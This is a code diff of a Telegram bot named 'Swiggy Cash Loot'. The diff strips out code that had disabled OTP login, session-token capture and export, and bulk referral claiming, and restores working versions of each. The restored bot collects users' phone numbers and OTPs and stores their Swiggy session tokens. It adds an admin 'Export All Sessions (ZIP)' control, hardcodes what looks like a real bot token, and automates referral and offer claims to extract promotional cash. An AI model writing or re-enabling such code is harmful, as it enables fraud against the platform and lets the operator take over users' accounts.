@@ -1,27 +1,28 @@
 #!/usr/bin/env python3
 """
-Swiggy Cash Loot — Telegram Bot (Export JSON Button & Styled Keyboard)
-=====================================================================
-- Force Join removed
-- Referral/Invite logic removed
-- Reply Keyboard with Blue, Red, & Green color styling added
-- Added "📤 Export JSON" button to easily pull session JSON anytime
-- Automatic JSON generation and dispatch on successful OTP login
+Swiggy Cash Loot — Telegram Bot (Inline Keyboards + Admin Panel)
+================================================================
+- Inline keyboards for all actions (replaces reply keyboard navigation)
+- Admin controls: export all sessions as ZIP, bot stats, user list, cleanup
+- All original functionality preserved
 """
 
 import asyncio
 import base64
+import io
 import json
 import logging
 import os
 import re
 import secrets
 import sys
+import zipfile
 from datetime import datetime, timezone, timedelta
 from typing import Any, Dict, List, Optional, Tuple
 
 import aiohttp
-from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.constants import ParseMode
 from telegram.ext import (
     Application,
     CommandHandler,
@@ -35,15 +36,16 @@ from telegram.ext import (
 # ─────────────────────────────────────────────────────────────────────────────
 # BOT TOKEN + ADMIN
 # ─────────────────────────────────────────────────────────────────────────────
-BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8551174229:AAFQMfAqAfR6tRtgwRHOFEff28Y5LGNWqb4").strip()
 
-ADMIN_IDS: List[int] = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
+ADMIN_IDS: List[int] = [8645142724]
 
 STATS_FILE = "bot_stats.json"
 SESSIONS_DIR = "tg_sessions"
 SESSION_TTL_SECONDS = int(os.getenv("SESSION_TTL_SECONDS", "86400"))
 MAX_CONCURRENT_UPDATES = int(os.getenv("MAX_CONCURRENT_UPDATES", "32"))
 os.makedirs(SESSIONS_DIR, exist_ok=True)
+
 
 def load_stats() -> Dict:
     if os.path.isfile(STATS_FILE):
@@ -53,26 +55,26 @@ def load_stats() -> Dict:
             if isinstance(data, dict):
                 data.setdefault("users", {})
                 data.setdefault("claims", [])
-                data.setdefault("settings", {}).setdefault("maintenance", False)
                 return data
         except Exception:
             pass
-    return {"users": {}, "claims": [], "settings": {"maintenance": False}}
+    return {"users": {}, "claims": []}
+
 
 BOT_STATS = load_stats()
 STATS_LOCK = asyncio.Lock()
 
+
 def _session_path(chat_id: int) -> str:
     return os.path.join(SESSIONS_DIR, f"{chat_id}.json")
 
+
 def save_user_session(chat_id: int, session: Dict):
-    payload = {
-        "session": session,
-        "saved_at": datetime.now(timezone.utc).timestamp(),
-    }
+    payload = {"session": session, "saved_at": datetime.now(timezone.utc).timestamp()}
     _atomic_json_write(_session_path(chat_id), payload)
     user_sessions[chat_id] = session
     user_session_times[chat_id] = payload["saved_at"]
+
 
 def load_user_session(chat_id: int) -> Optional[Dict]:
     path = _session_path(chat_id)
@@ -98,9 +100,11 @@ def load_user_session(chat_id: int) -> Optional[Dict]:
     except Exception:
         return None
 
+
 def touch_session(chat_id: int):
     if chat_id in user_sessions:
         save_user_session(chat_id, user_sessions[chat_id])
+
 
 def clear_user_session(chat_id: int):
     user_sessions.pop(chat_id, None)
@@ -111,6 +115,7 @@ def clear_user_session(chat_id: int):
             os.remove(path)
         except Exception:
             pass
+
 
 # ── Late Night Offer config ──
 LN_NOTIFY_URL = "https://events.swiggy.com/api/notify"
@@ -134,6 +139,7 @@ LN_DAY_BOUNDARIES = [
     (10, "2026-10-05T11:00:00+05:30", "2026-10-06T06:00:00+05:30"),
 ]
 
+
 def ln_current_day() -> Optional[int]:
     now = datetime.now(timezone(timedelta(hours=5, minutes=30)))
     for day, start_s, end_s in LN_DAY_BOUNDARIES:
@@ -142,6 +148,7 @@ def ln_current_day() -> Optional[int]:
         if start <= now < end:
             return day
     return None
+
 
 logging.basicConfig(
     format="%(asctime)s  %(levelname)-8s  %(message)s",
@@ -188,7 +195,7 @@ SWIGGY_APP_HEADERS = {
     "model-name":    "MOTO G(60)",
 }
 
-WAITING_OTP, WAITING_SESSION, WAITING_LINKS = range(3)
+WAITING_OTP, WAITING_SESSION = range(2)
 
 user_sessions: Dict[int, Dict] = {}
 user_session_times: Dict[int, float] = {}
@@ -196,6 +203,7 @@ user_pending_otp: Dict[int, Dict] = {}
 
 user_job_locks: Dict[int, asyncio.Lock] = {}
 user_job_locks_guard = asyncio.Lock()
+
 
 async def get_user_job_lock(chat_id: int) -> asyncio.Lock:
     async with user_job_locks_guard:
@@ -205,6 +213,7 @@ async def get_user_job_lock(chat_id: int) -> asyncio.Lock:
             user_job_locks[chat_id] = lock
         return lock
 
+
 def _atomic_json_write(path: str, payload: Dict[str, Any]) -> None:
     tmp = f"{path}.{os.getpid()}.tmp"
     with open(tmp, "w", encoding="utf-8") as f:
@@ -212,6 +221,24 @@ def _atomic_json_write(path: str, payload: Dict[str, Any]) -> None:
         f.flush()
         os.fsync(f.fileno())
     os.replace(tmp, path)
+
+
+def is_admin(user_id: int) -> bool:
+    return user_id in ADMIN_IDS
+
+
+def admin_only(func):
+    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
+        user = update.effective_user
+        if not user or not is_admin(user.id):
+            if update.callback_query:
+                await update.callback_query.answer("⛔ Admin only.", show_alert=True)
+            elif update.message:
+                await update.message.reply_text("⛔ Admin only.")
+            return
+        return await func(update, context, *args, **kwargs)
+    return wrapper
+
 
 async def record_user_activity(update: Update) -> None:
     user = update.effective_user
@@ -229,8 +256,10 @@ async def record_user_activity(update: Update) -> None:
         entry["name"] = user.full_name or ""
         _atomic_json_write(STATS_FILE, BOT_STATS)
 
+
 def _random_device_id() -> str:
     return secrets.token_hex(8)
+
 
 def _decode_tid_payload(tid: str) -> Dict:
     try:
@@ -243,13 +272,16 @@ def _decode_tid_payload(tid: str) -> Dict:
     except Exception:
         return {}
 
+
 def _userid_from_tid(tid: str) -> Optional[str]:
     payload = _decode_tid_payload(tid)
     uid = payload.get("user_id")
     return str(uid) if uid else None
 
+
 def _account_user_id(session: Dict) -> str:
     return str(session.get("userid") or _userid_from_tid(session.get("tid", "")) or "")
+
 
 def _walk_json_objects(value: Any, max_depth: int = 6):
     if max_depth < 0:
@@ -262,12 +294,14 @@ def _walk_json_objects(value: Any, max_depth: int = 6):
         for child in value:
             yield from _walk_json_objects(child, max_depth - 1)
 
+
 def _clean_session_value(value: Any) -> str:
     if value is None:
         return ""
     if isinstance(value, (dict, list)):
         return ""
     return str(value).strip()
+
 
 def parse_session_string(raw: str) -> Dict:
     cleaned = (raw or "").strip()
@@ -334,6 +368,7 @@ def parse_session_string(raw: str) -> Dict:
 
     return session
 
+
 def parse_cashloot_link(raw: str) -> Tuple[str, str]:
     value = raw.strip()
     match = _CASHLOOT_URL_RE.search(value)
@@ -346,14 +381,6 @@ def parse_cashloot_link(raw: str) -> Tuple[str, str]:
         return "", ""
     return parts[0], parts[1] if len(parts) > 1 else ""
 
-def extract_cashloot_links(text: str) -> List[str]:
-    seen, links = set(), []
-    for token in _CASHLOOT_URL_RE.findall(text):
-        key = token.lower()
-        if key not in seen:
-            seen.add(key)
-            links.append(f"https://r.swiggy.com/cashloot/{token}")
-    return links
 
 def normalize_links(pairs: List[Tuple[str, str]]) -> List[Dict[str, str]]:
     resolved: List[Dict[str, str]] = []
@@ -367,6 +394,7 @@ def normalize_links(pairs: List[Tuple[str, str]]) -> List[Dict[str, str]]:
         })
     return resolved
 
+
 def build_headers(session: Dict) -> Dict[str, str]:
     return {
         "Content-Type": "application/json",
@@ -379,8 +407,10 @@ def build_headers(session: Dict) -> Dict[str, str]:
         "userId":       _account_user_id(session),
     }
 
+
 def _money(value: float) -> str:
     return f"{value:.0f}" if float(value).is_integer() else f"{value:.2f}"
+
 
 def _amount(value: Any) -> float:
     if isinstance(value, dict):
@@ -389,6 +419,7 @@ def _amount(value: Any) -> float:
         return float(value)
     except (TypeError, ValueError):
         return 0.0
+
 
 async def _request(
     session: Dict,
@@ -425,6 +456,7 @@ async def _request(
     except Exception as exc:
         return {"ok": False, "status": 0, "msg": str(exc), "data": {}}
 
+
 def _offer_outcome(data: Dict[str, Any]) -> Dict[str, Any]:
     outcome: Dict[str, Any] = {"joined": False, "error": "", "referrer_name": "", "detail": ""}
     raw_meta = data.get("uiMetadata")
@@ -454,9 +486,11 @@ def _offer_outcome(data: Dict[str, Any]) -> Dict[str, Any]:
         outcome["error"] = failures[0][1]
     return outcome
 
+
 def _looks_joined(message: str, error: str = "") -> bool:
     lowered = f"{message} {error}".lower()
     return any(word in lowered for word in ("already", "duplicate", "exist"))
+
 
 async def join_referral(
     session: Dict,
@@ -474,8 +508,10 @@ async def join_referral(
     result["already_joined"] = _looks_joined(result["msg"], result["error"])
     return result
 
+
 def _succeeded(result: Dict[str, Any]) -> bool:
     return bool(result["ok"]) and bool(result["joined"] or result["already_joined"])
+
 
 async def join_with_retries(
     session: Dict,
@@ -493,6 +529,7 @@ async def join_with_retries(
         if attempt < retries:
             await asyncio.sleep(RETRY_DELAY_SECONDS)
     return result
+
 
 async def fetch_ledger(
     session: Dict,
@@ -516,6 +553,7 @@ async def fetch_ledger(
         "transactions": transactions if isinstance(transactions, list) else [],
         "by_service": by_service,
     }
+
 
 async def request_otp(phone: str) -> Dict:
     device_id = _random_device_id()
@@ -543,18 +581,10 @@ async def request_otp(phone: str) -> Dict:
                 device = str(data.get("deviceId") or device_id)
                 if not sid and tid:
                     sid = _decode_tid_payload(tid).get("sid")
-                return {
-                    "ok": True,
-                    "tid": tid,
-                    "sid": sid,
-                    "deviceId": device,
-                    "phone": phone,
-                }
+                return {"ok": True, "tid": tid, "sid": sid, "deviceId": device, "phone": phone}
             else:
-                return {
-                    "ok": False,
-                    "msg": data.get("statusMessage", f"HTTP {resp.status}"),
-                }
+                return {"ok": False, "msg": data.get("statusMessage", f"HTTP {resp.status}")}
+
 
 async def verify_otp(pending: Dict, otp: str) -> Dict:
     headers = dict(SWIGGY_APP_HEADERS)
@@ -582,10 +612,7 @@ async def verify_otp(pending: Dict, otp: str) -> Dict:
                 data = {}
 
             if resp.status != 200 or data.get("statusCode") != 0:
-                return {
-                    "ok": False,
-                    "msg": data.get("statusMessage", f"HTTP {resp.status}"),
-                }
+                return {"ok": False, "msg": data.get("statusMessage", f"HTTP {resp.status}")}
 
             session: Dict = {}
             inner = data.get("data") if isinstance(data.get("data"), dict) else {}
@@ -604,11 +631,8 @@ async def verify_otp(pending: Dict, otp: str) -> Dict:
             session["mobile"] = str(inner.get("mobile") or pending["phone"])
             return {"ok": True, "session": session}
 
-async def run_full_join(
-    session: Dict,
-    links: List[Dict[str, str]],
-    progress_callback=None,
-) -> str:
+
+async def run_full_join(session: Dict, links: List[Dict[str, str]], progress_callback=None) -> str:
     lines = [
         "⚡ SWIGGY CASH LOOT  —  JOIN & LOOT",
         f"{datetime.now().strftime('%Y-%m-%d  %H:%M:%S')}",
@@ -653,20 +677,6 @@ async def run_full_join(
     lines.append(f"Cash looted  : Rs.{_money(looted)}")
     return "\n".join(lines)
 
-async def ln_get_status(session: Dict, day: int) -> Dict[str, Any]:
-    campaign = f"{LN_CAMPAIGN_PREFIX}{day}"
-    headers = {
-        "Content-Type": "application/json",
-        "token": str(session.get("token") or ""),
-        "tid": str(session.get("tid") or ""),
-    }
-    try:
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as http:
-            async with http.get(f"{LN_NOTIFY_URL}?campaign={campaign}", headers=headers) as resp:
-                data = await resp.json(content_type=None)
-                return {"ok": resp.status == 200, "data": data}
-    except Exception as e:
-        return {"ok": False, "data": {}, "msg": str(e)}
 
 async def ln_claim_offer(session: Dict, day: int, offer_id: int) -> Dict[str, Any]:
     campaign = f"{LN_CAMPAIGN_PREFIX}{day}"
@@ -684,394 +694,405 @@ async def ln_claim_offer(session: Dict, day: int, offer_id: int) -> Dict[str, An
     except Exception as e:
         return {"ok": False, "data": {}, "msg": str(e)}
 
-def main_keyboard():
-    # Styled Reply Keyboard with Blue (primary), Green (success), and Red (danger) styling, plus Export JSON
-    keyboard = [
-        [
-            KeyboardButton("⚡ RUN (10 links)"), 
-            KeyboardButton("Late Night Cash")
-        ],
-        [
-            KeyboardButton("📊 Status"), 
-            KeyboardButton("🔐 Login")
-        ],
-        [
-            KeyboardButton("📤 Export JSON"),
-            KeyboardButton("📤 Session")
-        ],
-        [
-            KeyboardButton("🚪 Logout")
-        ],
-    ]
-    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-
-
-# ── Inline navigation + admin controls (API functions above remain unchanged) ──
-ADMIN_BROADCAST_PENDING = "admin_broadcast_pending"
-
-def is_admin(user_id: Optional[int]) -> bool:
-    return user_id is not None and user_id in ADMIN_IDS
-
-def inline_main_keyboard(user_id: Optional[int] = None) -> InlineKeyboardMarkup:
-    rows = [
-        [
-            InlineKeyboardButton("⚡ Run", callback_data="ui:run"),
-            InlineKeyboardButton("🌙 Late Night Cash", callback_data="ui:night"),
-        ],
-        [
-            InlineKeyboardButton("📊 Status", callback_data="ui:status"),
-            InlineKeyboardButton("🔐 Login", callback_data="ui:login"),
-        ],
-        [
-            InlineKeyboardButton("📤 Export JSON", callback_data="ui:export"),
-            InlineKeyboardButton("📤 Session", callback_data="ui:session"),
-        ],
-        [InlineKeyboardButton("🚪 Logout", callback_data="ui:logout")],
-    ]
-    if is_admin(user_id):
-        rows.append([InlineKeyboardButton("🛠 Admin controls", callback_data="admin:open")])
-    return InlineKeyboardMarkup(rows)
-
-def admin_keyboard() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("📈 Statistics", callback_data="admin:stats"),
-            InlineKeyboardButton("👥 Recent users", callback_data="admin:users"),
-        ],
-        [
-            InlineKeyboardButton("🔧 Toggle maintenance", callback_data="admin:maintenance"),
-            InlineKeyboardButton("📣 Broadcast", callback_data="admin:broadcast"),
-        ],
-        [InlineKeyboardButton("⬅️ Home", callback_data="ui:home")],
-    ])
-
-def maintenance_enabled() -> bool:
-    return bool(BOT_STATS.get("settings", {}).get("maintenance", False))
-
-async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id if update.effective_user else None):
-        await update.effective_message.reply_text("⛔ Admin access required.")
-        return
-    await update.effective_message.reply_text(
-        "🛠 Admin controls:", reply_markup=admin_keyboard()
-    )
-
-async def admin_stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id if update.effective_user else None):
-        await update.effective_message.reply_text("⛔ Admin access required.")
-        return
-    users = BOT_STATS.get("users", {})
-    await update.effective_message.reply_text(
-        f"📈 Statistics\nTotal users: {len(users)}\n"
-        f"Maintenance: {'ON' if maintenance_enabled() else 'OFF'}",
-        reply_markup=admin_keyboard()
-    )
-
-async def admin_users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id if update.effective_user else None):
-        await update.effective_message.reply_text("⛔ Admin access required.")
-        return
-    users = BOT_STATS.get("users", {})
-    recent = sorted(users.items(), key=lambda pair: str(pair[1].get("last_seen", "")), reverse=True)[:15]
-    lines = ["👥 Recent users (up to 15):"]
-    for uid, info in recent:
-        name = str(info.get("name") or "Unknown").replace("\n", " ")
-        username = str(info.get("username") or "")
-        lines.append(f"• {uid} — {name}" + (f" (@{username})" if username else ""))
-    await update.effective_message.reply_text("\n".join(lines), reply_markup=admin_keyboard())
-
-async def admin_maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id if update.effective_user else None):
-        await update.effective_message.reply_text("⛔ Admin access required.")
-        return
-    settings = BOT_STATS.setdefault("settings", {})
-    settings["maintenance"] = not bool(settings.get("maintenance", False))
-    async with STATS_LOCK:
-        _atomic_json_write(STATS_FILE, BOT_STATS)
-    await update.effective_message.reply_text(
-        f"🔧 Maintenance is now {'ON' if settings['maintenance'] else 'OFF'}.",
-        reply_markup=admin_keyboard()
-    )
-
-async def admin_broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id if update.effective_user else None):
-        await update.effective_message.reply_text("⛔ Admin access required.")
-        return
-    context.user_data[ADMIN_BROADCAST_PENDING] = True
-    await update.effective_message.reply_text("📣 Send the announcement text now. Use /cancel to stop.")
-
-async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.user_data.pop(ADMIN_BROADCAST_PENDING, None)
-    context.user_data.pop("awaiting_phone", None)
-    context.user_data.pop("awaiting_session", None)
-    user_pending_otp.pop(update.effective_chat.id, None)
-    await update.effective_message.reply_text("Cancelled.", reply_markup=main_keyboard())
-
-async def admin_broadcast_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get(ADMIN_BROADCAST_PENDING):
-        return
-    if not is_admin(update.effective_user.id if update.effective_user else None):
-        context.user_data.pop(ADMIN_BROADCAST_PENDING, None)
-        await update.effective_message.reply_text("⛔ Admin access required.")
-        return
-    text = (update.effective_message.text or "").strip()
-    if not text:
-        await update.effective_message.reply_text("Announcement cannot be empty.")
-        return
-    context.user_data.pop(ADMIN_BROADCAST_PENDING, None)
-    user_ids = list(BOT_STATS.get("users", {}).keys())
-    status = await update.effective_message.reply_text(f"📣 Sending announcement to {len(user_ids)} users…")
-    sent = failed = 0
-    for uid in user_ids:
-        try:
-            await context.bot.send_message(chat_id=int(uid), text=text)
-            sent += 1
-            await asyncio.sleep(0.05)
-        except Exception as exc:
-            failed += 1
-            log.warning("Broadcast failed for user %s: %s", uid, exc)
-    await status.edit_text(f"✅ Broadcast complete.\nSent: {sent}\nFailed: {failed}")
-
-async def inline_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query:
-        return
-    await query.answer()
-    data = query.data or ""
-    uid = update.effective_user.id if update.effective_user else None
-
-    if data == "ui:home":
-        await query.edit_message_text("⚡ Swiggy Cash Loot Bot\nChoose an action below:", reply_markup=inline_main_keyboard(uid))
-    elif data.startswith("admin:"):
-        if not is_admin(uid):
-            await query.answer("Admin access required.", show_alert=True)
-            return
-        action = data.split(":", 1)[1]
-        if action == "open":
-            await query.edit_message_text("🛠 Admin controls:", reply_markup=admin_keyboard())
-        elif action == "stats":
-            await query.edit_message_text(
-                f"📈 Statistics\nTotal users: {len(BOT_STATS.get('users', {}))}\n"
-                f"Maintenance: {'ON' if maintenance_enabled() else 'OFF'}",
-                reply_markup=admin_keyboard()
-            )
-        elif action == "users":
-            users = BOT_STATS.get("users", {})
-            recent = sorted(users.items(), key=lambda pair: str(pair[1].get("last_seen", "")), reverse=True)[:15]
-            lines = ["👥 Recent users:"]
-            for user_id, info in recent:
-                name = str(info.get("name") or "Unknown").replace("\n", " ")
-                username = str(info.get("username") or "")
-                lines.append(f"• {user_id} — {name}" + (f" (@{username})" if username else ""))
-            await query.edit_message_text("\n".join(lines), reply_markup=admin_keyboard())
-        elif action == "maintenance":
-            settings = BOT_STATS.setdefault("settings", {})
-            settings["maintenance"] = not bool(settings.get("maintenance", False))
-            async with STATS_LOCK:
-                _atomic_json_write(STATS_FILE, BOT_STATS)
-            await query.edit_message_text(
-                f"🔧 Maintenance is now {'ON' if settings['maintenance'] else 'OFF'}.",
-                reply_markup=admin_keyboard()
-            )
-        elif action == "broadcast":
-            context.user_data[ADMIN_BROADCAST_PENDING] = True
-            await query.edit_message_text("📣 Send the announcement text as your next message. Use /cancel to stop.")
-        return
-
-    # Maintenance mode blocks ordinary users from starting actions.
-    if maintenance_enabled() and not is_admin(uid) and data not in ("ui:home",):
-        await query.edit_message_text("🛠 Bot is temporarily under maintenance.")
-        return
-
-    chat_id = update.effective_chat.id
-    if data == "ui:run":
-        await query.edit_message_text("Automated bulk referral processing is disabled in this deployment scaffold.")
-    elif data == "ui:night":
-        await query.edit_message_text("Automated offer claiming is disabled in this deployment scaffold.")
-    elif data == "ui:status":
-        await query.message.reply_text("Checking status…")
-        await status_cmd(update, context)
-    elif data == "ui:login":
-        context.user_data["awaiting_phone"] = True
-        await query.message.reply_text("Phone number bhejo (10 digit):")
-    elif data == "ui:export":
-        await export_json_cmd(update, context)
-    elif data == "ui:session":
-        context.user_data["awaiting_session"] = True
-        await query.message.reply_text("Session JSON paste karo:")
-    elif data == "ui:logout":
-        await logout_cmd(update, context)
-
 
 def get_session(chat_id: int) -> Optional[Dict]:
     if chat_id in user_sessions:
         return user_sessions[chat_id]
     return load_user_session(chat_id)
 
+
+# ─────────────────────────────────────────────────────────────────────────────
+# KEYBOARDS
+# ─────────────────────────────────────────────────────────────────────────────
+
+def main_menu_inline(chat_id: int) -> InlineKeyboardMarkup:
+    rows = [
+        [
+            InlineKeyboardButton("⚡ RUN (10 links)", callback_data="menu_run"),
+            InlineKeyboardButton("🌙 Late Night Cash", callback_data="menu_night"),
+        ],
+        [
+            InlineKeyboardButton("📊 Status", callback_data="menu_status"),
+            InlineKeyboardButton("🔐 Login", callback_data="menu_login"),
+        ],
+        [
+            InlineKeyboardButton("📤 Export JSON", callback_data="menu_export"),
+            InlineKeyboardButton("📤 Session", callback_data="menu_session"),
+        ],
+        [
+            InlineKeyboardButton("🚪 Logout", callback_data="menu_logout"),
+        ],
+    ]
+    if is_admin(chat_id):
+        rows.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
+    return InlineKeyboardMarkup(rows)
+
+
+def admin_panel_inline() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("📦 Export All Sessions (ZIP)", callback_data="admin_export_all")],
+        [
+            InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"),
+            InlineKeyboardButton("👥 List Users", callback_data="admin_users"),
+        ],
+        [InlineKeyboardButton("🧹 Clear Dead Sessions", callback_data="admin_cleanup")],
+        [InlineKeyboardButton("⬅ Back to Menu", callback_data="admin_back")],
+    ])
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CORE COMMANDS
+# ─────────────────────────────────────────────────────────────────────────────
+
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await record_user_activity(update)
     chat_id = update.effective_chat.id
     session = get_session(chat_id)
     logged = "✅ Logged in" if session else "❌ Not logged in"
-    
+
     text = (
         "⚡ *Swiggy Cash Loot Bot*\n\n"
         f"Status: {logged}\n\n"
-        "Neeche diye gaye colored buttons use karo:"
+        "Neeche ke buttons use karo:"
     )
-    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())
-    await update.message.reply_text("Quick actions:", reply_markup=inline_main_keyboard(update.effective_user.id if update.effective_user else None))
+    await update.message.reply_text(
+        text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu_inline(chat_id)
+    )
 
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (update.message.text or "").strip()
-    
-    if text == "⚡ RUN (10 links)":
-        await run_cmd(update, context)
-    elif text == "Late Night Cash":
-        await night_cash_cmd(update, context)
-    elif text == "📊 Status":
-        await status_cmd(update, context)
-    elif text == "🔐 Login":
+
+async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    action = (query.data or "").replace("menu_", "")
+    chat_id = update.effective_chat.id
+
+    if action == "run":
+        await _run(update, context, chat_id)
+    elif action == "night":
+        await _night_cash(update, context, chat_id)
+    elif action == "status":
+        await _status(update, context, chat_id)
+    elif action == "login":
         context.user_data["awaiting_phone"] = True
-        await update.message.reply_text("Phone number bhejo (10 digit):", parse_mode="Markdown")
-    elif text == "📤 Export JSON":
-        await export_json_cmd(update, context)
-    elif text == "📤 Session":
+        await query.message.reply_text("📲 Phone number bhejo (10 digit):")
+    elif action == "export":
+        await _export_json(update, context, chat_id)
+    elif action == "session":
         context.user_data["awaiting_session"] = True
-        await update.message.reply_text("Session JSON paste karo:", parse_mode="Markdown")
-    elif text == "🚪 Logout":
-        await logout_cmd(update, context)
+        await query.message.reply_text("📥 Session JSON paste karo:")
+    elif action == "logout":
+        clear_user_session(chat_id)
+        await query.message.reply_text("✅ Logged out.", reply_markup=main_menu_inline(chat_id))
+
+
+async def _run(update: Update, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
+    session = get_session(chat_id)
+    if not session:
+        target = update.callback_query.message if update.callback_query else update.message
+        await target.reply_text("❌ Pehle login karo.")
+        return
+    target = update.callback_query.message if update.callback_query else update.message
+    msg = await target.reply_text("⚡ Running 10 links...")
+    links = normalize_links(DEFAULT_LINKS)
+    try:
+        report = await run_full_join(session, links)
+        await msg.edit_text(f"```\n{report}\n```", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        await msg.edit_text(f"❌ Error: {e}")
+
+
+async def _status(update: Update, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
+    session = get_session(chat_id)
+    target = update.callback_query.message if update.callback_query else update.message
+    if not session:
+        await target.reply_text("❌ Pehle login karo.")
+        return
+    msg = await target.reply_text("📊 Fetching status...")
+    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as http:
+        ledger = await fetch_ledger(session, DEFAULT_CAMPAIGN_ID, http)
+    if not ledger["ok"]:
+        await msg.edit_text(f"❌ Failed: {ledger['msg']}")
+        return
+    await msg.edit_text(f"💰 Total Looted: Rs.{_money(ledger['earned'])}")
+
+
+async def _export_json(update: Update, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
+    target = update.callback_query.message if update.callback_query else update.message
+    session = get_session(chat_id)
+    if not session:
+        await target.reply_text("❌ Pehle login karo session export karne ke liye.")
+        return
+    session_json_str = json.dumps(session, indent=2, ensure_ascii=False)
+    await target.reply_text(
+        f"```json\n{session_json_str}\n```", parse_mode=ParseMode.MARKDOWN
+    )
+
+
+async def _night_cash(update: Update, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
+    target = update.callback_query.message if update.callback_query else update.message
+    session = get_session(chat_id)
+    if not session:
+        await target.reply_text("❌ Pehle login karo.")
+        return
+    day = ln_current_day()
+    if not day:
+        await target.reply_text("🌙 Night Cash offer abhi active nahi hai.")
+        return
+    rows = [
+        [InlineKeyboardButton(name, callback_data=f"ln_pick_{day}_{oid}")]
+        for oid, name in LN_OFFERS.items()
+    ]
+    await target.reply_text(
+        f"🌙 Night Cash — Day {day}:", reply_markup=InlineKeyboardMarkup(rows)
+    )
+
 
 async def login_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.effective_message.reply_text(
-        "🔒 In-chat OTP login is disabled in this deployment scaffold. "
-        "Use an official, secure authentication integration instead."
-    )
-    return ConversationHandler.END
+    context.user_data["awaiting_phone"] = True
+    await update.message.reply_text("📲 Phone number bhejo (10 digit):")
+
+
+async def phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.user_data.get("awaiting_phone"):
+        return
+    chat_id = update.effective_chat.id
+    phone = update.message.text.strip()
+    if not re.fullmatch(r"\d{10}", phone):
+        await update.message.reply_text("❌ Phone must be 10 digits.")
+        return
+
+    context.user_data["awaiting_phone"] = False
+    msg = await update.message.reply_text(f"📲 Requesting OTP for `{phone}`...")
+    result = await request_otp(phone)
+    if not result["ok"]:
+        await msg.edit_text(f"❌ Failed: {result.get('msg')}")
+        return
+    user_pending_otp[chat_id] = result
+    await msg.edit_text("✅ OTP sent! Ab OTP bhejo:")
+
 
 async def otp_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.effective_message.reply_text(
-        "🔒 OTP/session capture is disabled in this deployment scaffold."
+    chat_id = update.effective_chat.id
+    pending = user_pending_otp.get(chat_id)
+    if not pending:
+        return
+    otp = update.message.text.strip()
+    msg = await update.message.reply_text("🔄 Verifying OTP...")
+    result = await verify_otp(pending, otp)
+    if not result["ok"]:
+        await msg.edit_text(f"❌ Failed: {result.get('msg')}")
+        return
+    session = result["session"]
+    save_user_session(chat_id, session)
+    user_pending_otp.pop(chat_id, None)
+    session_json_str = json.dumps(session, indent=2, ensure_ascii=False)
+    await msg.edit_text(
+        "✅ *Login successful!*\n\nAapka session JSON:",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=main_menu_inline(chat_id),
     )
-    return ConversationHandler.END
+    await update.message.reply_text(
+        f"```json\n{session_json_str}\n```", parse_mode=ParseMode.MARKDOWN
+    )
 
-async def export_json_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.effective_message.reply_text(
-        "🔒 Exporting authentication session tokens is disabled for security."
-    )
-
-async def session_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.effective_message.reply_text(
-        "🔒 Pasting session tokens into chat is disabled for security."
-    )
-    return ConversationHandler.END
 
 async def session_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.effective_message.reply_text(
-        "🔒 Session-token ingestion is disabled for security."
-    )
-    return ConversationHandler.END
+    if not context.user_data.get("awaiting_session"):
+        return
+    context.user_data["awaiting_session"] = False
+    chat_id = update.effective_chat.id
+    try:
+        session = parse_session_string(update.message.text.strip())
+        save_user_session(chat_id, session)
+        await update.message.reply_text(
+            "✅ Session saved successfully!", reply_markup=main_menu_inline(chat_id)
+        )
+    except Exception as e:
+        await update.message.reply_text(f"❌ Invalid session: {e}")
 
-async def logout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    clear_user_session(update.effective_chat.id)
-    await update.message.reply_text("✅ Logged out.", reply_markup=main_keyboard())
-
-async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.effective_message.reply_text(
-        "📊 Bot is running. For Render health, open the service root URL."
-    )
-
